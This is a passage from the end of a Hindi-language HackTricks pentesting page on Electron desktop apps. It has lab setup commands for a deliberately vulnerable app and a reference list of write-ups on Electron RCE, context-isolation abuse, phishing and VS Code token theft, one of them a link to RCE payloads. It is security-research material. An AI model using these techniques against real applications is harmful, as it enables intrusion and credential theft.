# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

मौजूदा bookmarks के लिए पहले प्रकाशित पता: [Electron desktop apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)। पूरे पेज का route यहाँ redirect होता है; ऐतिहासिक fragment का रखरखाव नहीं किया जाता।

## References

- [1] [Electron applications में Phishing और credential harvesting](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App में Arbitrary File Read](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: context isolation की कमी का दुरुपयोग - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [XSS और RCE के साथ Modern Desktop apps को hack करने की Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js की (in)security के बारे में संसाधनों की चुनी हुई सूची](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron APIs का दुरुपयोग: हमलावर की पहली पसंद](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron Applications में 1-click RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron के shell.openExternal() के खतरे - remote code execution के कई रास्ते](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [मनमाने URLs की अनुमति दें, मनमाने code execution की अपेक्षा करें](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [एक obsolete Electron feature से मशहूर जापानी chat tool में RCE हासिल करना](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Restricted Mode में Remote Code Execution (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [VS Code Webview Keyboard Event Injection के ज़रिए One-Click GitHub Token Theft](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webviews मुख्य workbench में मनमाने keyboard shortcuts trigger कर सकते हैं](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: notebook खोलने की पुष्टि करें और caller-provided installExtension context स्वीकार करना बंद करें](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: notebook webviews में programmatic webview keypress/click re-dispatch को block करें](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / local workspace extensions](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: मैंने 2 हफ़्तों में हर बड़े IDE को कैसे hack किया](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Electron पर नए attack surface का पता लगाते हुए लोकप्रिय Desktop Apps को pwn करना](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron Security](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: कुछ भी Reverse Engineer करें](https://github.com/morluto/rea)
- [24] [REA JavaScript artifact reconstruction](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA cross-layer JavaScript application workflows](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
